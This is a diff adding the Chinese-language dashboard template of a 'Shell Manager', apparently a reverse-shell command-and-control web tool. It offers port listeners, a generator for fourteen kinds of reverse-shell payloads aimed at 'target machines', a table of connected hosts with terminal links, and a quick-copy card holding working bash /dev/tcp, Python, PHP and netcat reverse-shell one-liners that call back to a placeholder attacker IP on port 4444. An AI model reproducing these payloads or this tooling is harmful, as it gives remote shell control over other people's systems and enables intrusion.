@@ -1,0 +1,347 @@
+{% extends "base.html" %}
+
+{% block title %}首页 - Shell Manager{% endblock %}
+
+{% block active_page %}index{% endblock %}
+
+{% block page_title %}Dashboard{% endblock %}
+
+{% block content %}
+<!-- 统计卡片 -->
+<div class="grid grid-cols-4" style="margin-bottom: 24px;">
+    <div class="stat-card">
+        <div class="stat-icon blue"><span class="icon icon-listener"></span></div>
+        <div class="stat-content">
+            <div class="stat-value" id="stat-listeners">0</div>
+            <div class="stat-label">活跃监听器</div>
+        </div>
+    </div>
+    <div class="stat-card">
+        <div class="stat-icon green"><span class="icon icon-session"></span></div>
+        <div class="stat-content">
+            <div class="stat-value" id="stat-sessions">0</div>
+            <div class="stat-label">已连接主机</div>
+        </div>
+    </div>
+    <div class="stat-card">
+        <div class="stat-icon orange"><span class="icon icon-stack"></span></div>
+        <div class="stat-content">
+            <div class="stat-value" id="stat-total">0</div>
+            <div class="stat-label">总会话数</div>
+        </div>
+    </div>
+    <div class="stat-card">
+        <div class="stat-icon purple"><span class="icon icon-clock"></span></div>
+        <div class="stat-content">
+            <div class="stat-value" id="stat-uptime">--</div>
+            <div class="stat-label">运行时间</div>
+        </div>
+    </div>
+</div>
+
+<div class="grid grid-cols-2">
+    <!-- 快速启动监听器 -->
+    <div class="card">
+        <div class="card-header">
+            <div>
+                <h3 class="card-title">快速启动监听器</h3>
+                <p class="card-subtitle">启动一个端口监听等待连接</p>
+            </div>
+        </div>
+        <div class="input-group">
+            <label class="input-label">监听端口</label>
+            <input type="number" class="input" id="listener-port" value="4444" min="1" max="65535" placeholder="输入端口号">
+        </div>
+        <div style="display: flex; gap: 12px;">
+            <button type="button" class="btn btn-success" onclick="startListener()">
+                <span class="icon icon-play" aria-hidden="true"></span> 启动监听
+            </button>
+            <button type="button" class="btn btn-danger" onclick="stopListener()">
+                <span class="icon icon-stop" aria-hidden="true"></span> 停止监听
+            </button>
+        </div>
+        
+        <!-- 活跃监听器列表 -->
+        <div style="margin-top: 20px;">
+            <h4 style="font-size: 14px; font-weight: 600; color: var(--text-secondary); margin-bottom: 12px;">活跃监听器</h4>
+            <div id="listeners-list" style="display: flex; flex-direction: column; gap: 8px;">
+                <div class="empty-state" style="padding: 30px;">
+                    <div class="empty-state-icon" style="margin-bottom: 8px;"><span class="icon icon-moon" aria-hidden="true"></span></div>
+                    <div style="color: var(--text-tertiary);">暂无活跃监听器</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- 载荷生成器 -->
+    <div class="card">
+        <div class="card-header">
+            <div>
+                <h3 class="card-title">载荷生成器</h3>
+                <p class="card-subtitle">生成各种类型的反弹Shell命令</p>
+            </div>
+        </div>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+            <div class="input-group">
+                <label class="input-label">目标IP</label>
+                <input type="text" class="input" id="payload-host" placeholder="例如: 192.168.1.100">
+            </div>
+            <div class="input-group">
+                <label class="input-label">目标端口</label>
+                <input type="number" class="input" id="payload-port" value="4444" min="1" max="65535">
+            </div>
+        </div>
+        <div class="input-group">
+            <label class="input-label">载荷类型</label>
+            <select class="input" id="payload-type">
+                <option value="bash">Bash -i</option>
+                <option value="bash_udp">Bash UDP</option>
+                <option value="python">Python 2</option>
+                <option value="python3">Python 3</option>
+                <option value="php_exec">PHP exec</option>
+                <option value="php_passthru">PHP passthru</option>
+                <option value="perl">Perl</option>
+                <option value="ruby">Ruby</option>
+                <option value="nc">Netcat</option>
+                <option value="nc_mkfifo">Netcat (FIFO)</option>
+                <option value="powershell">PowerShell</option>
+                <option value="java">Java</option>
+                <option value="lua">Lua</option>
+                <option value="nodejs">Node.js</option>
+            </select>
+        </div>
+        <button type="button" class="btn btn-primary" onclick="generatePayload()" style="width: 100%;">
+            <span class="icon icon-magic" aria-hidden="true"></span> 生成载荷
+        </button>
+        
+        <!-- 生成的载荷 -->
+        <div id="payload-result" style="margin-top: 16px; display: none;">
+            <div class="code-block">
+                <div class="code-block-header">
+                    <span class="code-block-title" id="payload-type-label">Bash Reverse Shell</span>
+                </div>
+                <pre id="payload-code" style="margin: 0; white-space: pre-wrap; word-break: break-all;"></pre>
+                <button class="copy-btn" onclick="copyPayload()">复制</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- 最近连接 -->
+<div class="card">
+    <div class="card-header">
+        <div>
+            <h3 class="card-title">最近连接</h3>
+            <p class="card-subtitle">最近连接的主机列表</p>
+        </div>
+        <a href="/hosts" class="btn btn-ghost btn-sm">查看全部 →</a>
+    </div>
+    <div id="recent-sessions">
+        <div class="empty-state">
+            <div class="empty-state-icon"><span class="icon icon-empty"></span></div>
+            <div class="empty-state-title">暂无连接</div>
+            <div class="empty-state-desc">启动监听器后，生成的载荷在目标机器执行后将显示在这里</div>
+        </div>
+    </div>
+</div>
+
+<!-- 常用载荷快速复制 -->
+<div class="card">
+    <div class="card-header">
+        <div>
+            <h3 class="card-title">常用载荷快速复制</h3>
+            <p class="card-subtitle">点击即可复制，IP和端口需要手动修改</p>
+        </div>
+    </div>
+    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px;">
+        <div class="code-block" style="cursor: pointer;" onclick="copyToClipboard(this.querySelector('pre').textContent)">
+            <div class="code-block-header">
+                <span class="code-block-title">Bash</span>
+            </div>
+            <pre>bash -i >& /dev/tcp/YOUR_IP/4444 0>&1</pre>
+        </div>
+        <div class="code-block" style="cursor: pointer;" onclick="copyToClipboard(this.querySelector('pre').textContent)">
+            <div class="code-block-header">
+                <span class="code-block-title">Python</span>
+            </div>
+            <pre>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</pre>
+        </div>
+        <div class="code-block" style="cursor: pointer;" onclick="copyToClipboard(this.querySelector('pre').textContent)">
+            <div class="code-block-header">
+                <span class="code-block-title">PHP</span>
+            </div>
+            <pre>php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
+        </div>
+        <div class="code-block" style="cursor: pointer;" onclick="copyToClipboard(this.querySelector('pre').textContent)">
+            <div class="code-block-header">
+                <span class="code-block-title">Netcat</span>
+            </div>
+            <pre>nc -e /bin/sh YOUR_IP 4444</pre>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    // 加载统计数据
+    async function loadStats() {
+        try {
+            const [listenersData, sessionsData] = await Promise.all([
+                api('/api/listeners'),
+                api('/api/sessions')
+            ]);
+            
+            document.getElementById('stat-listeners').textContent = listenersData.listeners.length;
+            document.getElementById('stat-sessions').textContent = sessionsData.sessions.filter(s => s.is_alive).length;
+            document.getElementById('stat-total').textContent = sessionsData.sessions.length;
+            
+            renderListeners(listenersData.listeners);
+            renderRecentSessions(sessionsData.sessions);
+        } catch (e) {
+            console.error('加载统计数据失败:', e);
+        }
+    }
+    
+    // 渲染监听器列表
+    function renderListeners(listeners) {
+        const container = document.getElementById('listeners-list');
+        
+        if (listeners.length === 0) {
+            container.innerHTML = `
+                <div class="empty-state" style="padding: 30px;">
+                    <div class="empty-state-icon" style="margin-bottom: 8px;"><span class="icon icon-moon" aria-hidden="true"></span></div>
+                    <div style="color: var(--text-tertiary);">暂无活跃监听器</div>
+                </div>
+            `;
+            return;
+        }
+        
+        container.innerHTML = listeners.map(l => `
+            <div style="display: flex; align-items: center; justify-content: space-between; padding: 12px; background: var(--bg-deep); border-radius: 8px; border: 1px solid var(--border-subtle);">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <span class="status-badge online">
+                        <span class="status-dot"></span>
+                        运行中
+                    </span>
+                    <span style="font-weight: 500; color: var(--text-primary);">端口 ${l.port}</span>
+                    <span style="color: var(--text-tertiary); font-size: 13px;">${l.session_count} 个连接</span>
+                </div>
+                <button class="btn btn-ghost btn-sm" onclick="stopListenerByPort(${l.port})">
+                    停止
+                </button>
+            </div>
+        `).join('');
+    }
+    
+    // 渲染最近会话
+    function renderRecentSessions(sessions) {
+        const container = document.getElementById('recent-sessions');
+        const recent = sessions.slice(0, 5);
+        
+        if (recent.length === 0) {
+            container.innerHTML = `
+                <div class="empty-state">
+                    <div class="empty-state-icon"><span class="icon icon-empty"></span></div>
+                    <div class="empty-state-title">暂无连接</div>
+                    <div class="empty-state-desc">启动监听器后，生成的载荷在目标机器执行后将显示在这里</div>
+                </div>
+            `;
+            return;
+        }
+        
+        container.innerHTML = `
+            <div class="table-container">
+                <table class="table">
+                    <thead>
+                        <tr>
+                            <th>状态</th>
+                            <th>地址</th>
+                            <th>端口</th>
+                            <th>连接时间</th>
+                            <th>操作</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${recent.map(s => `
+                            <tr>
+                                <td>
+                                    <span class="status-badge ${s.is_alive ? 'online' : 'offline'}">
+                                        <span class="status-dot"></span>
+                                        ${s.is_alive ? '在线' : '离线'}
+                                    </span>
+                                </td>
+                                <td style="font-family: monospace;">${s.address}</td>
+                                <td>${s.port}</td>
+                                <td>${formatTime(s.connected_at)}</td>
+                                <td>
+                                    ${s.is_alive ? `<a href="/terminal/${s.id}" class="btn btn-primary btn-sm">连接</a>` : ''}
+                                </td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>
+            </div>
+        `;
+    }
+    
+    // 启动监听器
+    function startListener() {
+        const port = parseInt(document.getElementById('listener-port').value);
+        if (!port || port < 1 || port > 65535) {
+            showToast('请输入有效的端口号', 'error');
+            return;
+        }
+        socket.emit('start_listener', { port: port });
+    }
+    
+    // 停止监听器
+    function stopListener() {
+        const port = parseInt(document.getElementById('listener-port').value);
+        socket.emit('stop_listener', { port: port });
+    }
+    
+    // 按端口停止监听器
+    function stopListenerByPort(port) {
+        socket.emit('stop_listener', { port: port });
+        setTimeout(loadStats, 500);
+    }
+    
+    // 生成载荷
+    async function generatePayload() {
+        const host = document.getElementById('payload-host').value || 'YOUR_IP';
+        const port = document.getElementById('payload-port').value || '4444';
+        const type = document.getElementById('payload-type').value;
+        
+        try {
+            const data = await api('/api/generate_payload', {
+                method: 'POST',
+                body: { host, port, type }
+            });
+            
+            if (data.success) {
+                document.getElementById('payload-result').style.display = 'block';
+                document.getElementById('payload-type-label').textContent = type.toUpperCase() + ' Reverse Shell';
+                document.getElementById('payload-code').textContent = data.payload;
+            }
+        } catch (e) {
+            showToast('生成载荷失败', 'error');
+        }
+    }
+    
+    // 复制载荷
+    function copyPayload() {
+        const code = document.getElementById('payload-code').textContent;
+        copyToClipboard(code);
+    }
+    
+    // 监听事件
+    document.addEventListener('listener_started', loadStats);
+    document.addEventListener('listener_stopped', loadStats);
+    document.addEventListener('new_session', loadStats);
+    document.addEventListener('session_disconnected', loadStats);
+    
+    // 初始化
+    loadStats();
+</script>
+{% endblock %}
